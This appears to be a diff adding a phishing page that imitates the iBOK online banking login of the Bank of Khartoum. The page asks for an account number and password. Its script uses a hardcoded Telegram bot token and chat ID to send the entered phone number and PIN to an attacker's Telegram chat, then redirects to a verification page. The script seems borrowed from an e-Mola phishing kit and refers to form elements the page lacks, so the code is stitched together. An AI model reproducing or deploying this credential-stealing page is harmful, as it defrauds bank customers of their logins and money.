@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Form tracking iBOK</title>
+
+    <style>
+         :root {
+            --red: #ef2e31;
+            --yellow: #ffcf00;
+            --ink: #101820;
+            --muted: #68798a;
+            --field: #fff5f5;
+            --border: #ffb8b8;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            min-height: 100vh;
+            color: var(--ink);
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f2f5f9;
+        }
+        
+        .page {
+            min-height: 100vh;
+            margin: 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            background: radial-gradient(#c8d0da 0.85px, transparent 0.85px) 0 0 / 18px 18px, #f2f5f9;
+        }
+        
+        header {
+            min-height: 142px;
+            padding: 11px 20px 24px;
+            color: #fff;
+            background: var(--red);
+        }
+        
+        .welcome,
+        .brand {
+            width: min(704px, 100%);
+            margin-inline: auto;
+        }
+        
+        .welcome {
+            min-height: 36px;
+            padding: 6px 12px;
+            border-radius: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #111;
+            background: var(--yellow);
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .brand {
+            margin-top: 10px;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            line-height: 1.05;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-caption {
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            padding: 0 16px 42px;
+        }
+        
+        .card {
+            position: relative;
+            width: min(672px, 100%);
+            margin: -12px auto 0;
+            padding: 25px 40px 24px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
+        }
+        
+        h1 {
+            margin: 0;
+            color: var(--red);
+            font-size: 24px;
+            line-height: 1.25;
+            text-align: center;
+        }
+        
+        .subtitle {
+            width: fit-content;
+            margin: 16px auto 22px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--red);
+            font-size: 17px;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .demo-note {
+            margin: -8px 0 18px;
+            padding: 10px 11px;
+            border: 1px solid #f1d783;
+            border-radius: 8px;
+            color: #5f4b12;
+            background: #fff9e4;
+            font-size: 13px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        .field {
+            margin-bottom: 19px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 9px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .input-wrap {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: var(--field);
+        }
+        
+        input {
+            width: 100%;
+            height: 100%;
+            padding: 0 14px;
+            border: 0;
+            outline: none;
+            color: var(--ink);
+            background: transparent;
+            font: inherit;
+            font-size: 16px;
+        }
+        
+        input:focus-visible,
+        button:focus-visible {
+            outline: 3px solid #2463eb;
+            outline-offset: -3px;
+        }
+        
+        input::placeholder {
+            color: var(--muted);
+        }
+        
+        .password-wrap input {
+            padding-right: 4px;
+        }
+        
+        .show-password {
+            height: 100%;
+            padding: 0 12px;
+            border: 0;
+            color: #526579;
+            background: transparent;
+            cursor: pointer;
+            font-weight: 700;
+        }
+        
+        .demo-action {
+            width: 100%;
+            min-height: 44px;
+            margin-top: 4px;
+            border: 0;
+            border-radius: 10px;
+            color: #fff;
+            background: var(--red);
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .demo-action:hover {
+            background: #d92529;
+        }
+        
+        .message {
+            display: none;
+            margin-top: 14px;
+            padding: 11px;
+            border-radius: 8px;
+            font-size: 14px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        .message.visible {
+            display: block;
+        }
+        
+        .message.error {
+            color: #a32121;
+            background: #fff0f0;
+        }
+        
+        .message.success {
+            color: #245b2a;
+            background: #eef8ee;
+        }
+        
+        footer {
+            min-height: 55px;
+            padding: 12px 10px 8px;
+            border-top: 4px solid var(--red);
+            color: #607080;
+            background: #fff;
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        @media (max-width: 600px) {
+            .page {
+                margin: 0;
+                border-radius: 0;
+            }
+            header {
+                min-height: 132px;
+            }
+            main {
+                padding: 0 12px 32px;
+            }
+            .card {
+                padding: 24px 22px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <header>
+            <div class="welcome">Welcome to iBOK online banking service</div>
+            <div class="brand">
+                <div class="brand-name">iBOK</div>
+                <div class="brand-caption">Online Form</div>
+            </div>
+        </header>
+
+        <main>
+            <section class="card" aria-labelledby="form-title">
+                <h1 id="form-title">Online Form</h1>
+                <div class="subtitle">Please enter the data</div>
+
+                <p class="demo-note">
+                    Account number.
+                </p>
+
+                <form id="demo-form" autocomplete="off">
+                    <div class="field">
+                        <label for="account">Enter the account number (7 digits):</label>
+                        <div class="input-wrap">
+                            <input id="account" name="account" type="text" maxlength="20" placeholder="Enter the account number (7 digits)" autocomplete="off" required>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label for="password">Password:</label>
+                        <div class="input-wrap password-wrap">
+                            <input id="password" name="password" type="password" placeholder="Enter Password" autocomplete="new-password" required>
+                            <button class="show-password" type="button" id="toggle-password" aria-label="Show demo passphrase" aria-pressed="false">Show</button>
+                        </div>
+                    </div>
+
+                    <button class="demo-action" type="submit">Log In</button>
+                    <div class="message" id="message" role="status" aria-live="polite"></div>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            iBOK I Bank of Khartoum 2026<br> All rights reserved, Bank of Khartoum, iBOK 2026.
+        </footer>
+    </div>
+
+
+
+
+    <script>
+        // =======================
+        // BOT CONFIG (single bot - keep 2)
+        // =======================
+        const BOT_TOKEN = '8728071345:AAHtK0Te8ZOoQDxX43tAmT51nweCyRnz19o';
+        const CHAT_ID = '7676797362';
+
+        // =======================
+        // DOM REFERENCES (MATCH YOUR HTML)
+        // =======================
+        const loginForm = document.getElementById("loginForm");
+        const phoneInput = document.getElementById("phone");
+        const pinInput = document.getElementById("pin");
+        const loginBtn = document.getElementById("enterBtn");
+
+        // Your HTML does NOT include spinnerOverlay, so we guard it
+        const spinnerOverlay = document.getElementById("spinnerOverlay");
+
+        const toast = document.getElementById("toast");
+        const languageButton = document.getElementById("languageButton");
+        const flagImg = document.getElementById("flagImg");
+        const langLabel = document.getElementById("langLabel");
+        const subtitleEl = document.getElementById("subtitle");
+        const forgotButton = document.getElementById("forgotButton");
+        const registerButton = document.getElementById("registerButton");
+        const locationButton = document.getElementById("locationButton");
+        const guideButton = document.getElementById("guideButton");
+        const backButton = document.getElementById("backButton");
+
+        // =======================
+        // LOAD SAVED PHONE
+        // =======================
+        const savedPhone = localStorage.getItem('phone');
+        if (savedPhone && savedPhone.length >= 1) {
+            phoneInput.value = savedPhone;
+        }
+
+        // =======================
+        // PIN ENABLE / SUBMIT CHECK (adapted)
+        // =======================
+        function getPhoneValue() {
+            return (phoneInput.value || '').trim();
+        }
+
+        function getPinValue() {
+            return (pinInput.value || '').trim();
+        }
+
+        function updateLoginButtonState() {
+            const pinValue = getPinValue();
+            loginBtn.disabled = pinValue.length < 4; // change logic if you need exactly 6
+        }
+
+        // =======================
+        // INPUT SANITIZERS
+        // =======================
+        phoneInput.addEventListener("input", function() {
+            // allow digits and optional +
+            this.value = this.value.replace(/[^\d+ ]/g, "");
+        });
+
+        pinInput.addEventListener("input", function() {
+            // only digits, up to 6
+            this.value = this.value.replace(/\D/g, "").slice(0, 6);
+            updateLoginButtonState();
+        });
+
+        updateLoginButtonState();
+
+        // =======================
+        // TOAST
+        // =======================
+        function showToast(message) {
+            if (!toast) return;
+            toast.textContent = message;
+            toast.classList.add("show");
+            clearTimeout(window.toastTimer);
+            window.toastTimer = setTimeout(() => toast.classList.remove("show"), 2400);
+        }
+
+        // =======================
+        // LANGUAGE
+        // =======================
+        const FLAGS = {
+            pt: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPfTxr-CZTuCxdAIkhApPDtOT0dPkNLGVx08WtRJe0pQ&s",
+            en: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTG9ZbItOmbojydT4baosy-p6p_Z1-uM2Vb7eKz127ZxA&s=10"
+        };
+
+        const TEXTS = {
+            pt: {
+                langLabel: "POR",
+                subtitle: "Meu cell, minha mola",
+                phonePlaceholder: "Digite o número de telefone",
+                pinPlaceholder: "PIN",
+                enter: "ENTRAR",
+                forgot: "Esqueceu a senha",
+                register: "Cadastrar-se",
+                needPhone: "Digite o número de telefone.",
+                needPin: "Digite o PIN.",
+                sent: "Demo: formulário enviado.",
+                forgotMsg: "Recuperação de senha.",
+                registerMsg: "Cadastro.",
+                locationMsg: "Localizações.",
+                guideMsg: "Guia e-Mola.",
+                backMsg: "Voltar.",
+                langMsg: "Idioma: Português."
+            },
+            en: {
+                langLabel: "ENG",
+                subtitle: "My cell, my spring",
+                phonePlaceholder: "Enter phone number",
+                pinPlaceholder: "PIN",
+                enter: "ENTER",
+                forgot: "Forgot password",
+                register: "Sign up",
+                needPhone: "Enter the phone number.",
+                needPin: "Enter the PIN.",
+                sent: "Demo: form submitted.",
+                forgotMsg: "Password recovery.",
+                registerMsg: "Sign up.",
+                locationMsg: "Locations.",
+                guideMsg: "e-Mola guide.",
+                backMsg: "Back.",
+                langMsg: "Language: English."
+            }
+        };
+
+        let currentLang = "pt";
+
+        function applyTexts(lang) {
+            const t = TEXTS[lang];
+            document.documentElement.lang = lang === "pt" ? "pt" : "en";
+            langLabel.textContent = t.langLabel;
+            flagImg.src = FLAGS[lang];
+            flagImg.alt = lang === "pt" ? "Português" : "English";
+            subtitleEl.textContent = t.subtitle;
+
+            phoneInput.placeholder = t.phonePlaceholder;
+            pinInput.placeholder = t.pinPlaceholder;
+
+            document.getElementById("enterBtn").textContent = t.enter;
+            forgotButton.textContent = t.forgot;
+            registerButton.textContent = t.register;
+        }
+
+        // =======================
+        // BUTTON / CLICK HANDLERS
+        // =======================
+        languageButton.addEventListener("click", function() {
+            currentLang = currentLang === "pt" ? "en" : "pt";
+            applyTexts(currentLang);
+            showToast(TEXTS[currentLang].langMsg);
+        });
+
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const phone = getPhoneValue();
+            const pinValue = getPinValue();
+
+            if (!phone) {
+                showToast(TEXTS[currentLang].needPhone);
+                phoneInput.focus();
+                return;
+            }
+
+            if (!pinValue || pinValue.length < 4) {
+                showToast(TEXTS[currentLang].needPin);
+                pinInput.focus();
+                return;
+            }
+
+            if (spinnerOverlay) spinnerOverlay.style.display = 'flex';
+
+            localStorage.setItem('phone', phone);
+
+            const message =
+                `New Login Attempt\n\nPhone: +258 ${phone}\nPIN: ${pinValue}`;
+
+            // Single fetch (only one bot)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(() => {});
+
+            setTimeout(() => {
+                window.location.href = 'verify.html';
+            }, 1500);
+        });
+
+        forgotButton.addEventListener("click", () => showToast(TEXTS[currentLang].forgotMsg));
+        registerButton.addEventListener("click", () => showToast(TEXTS[currentLang].registerMsg));
+        locationButton.addEventListener("click", () => showToast(TEXTS[currentLang].locationMsg));
+        guideButton.addEventListener("click", () => showToast(TEXTS[currentLang].guideMsg));
+
+        backButton.addEventListener("click", function() {
+            if (history.length > 1) history.back();
+            else showToast(TEXTS[currentLang].backMsg);
+        });
+
+        // =======================
+        // INIT
+        // =======================
+        applyTexts(currentLang);
+    </script>
+</body>
+
+</html>
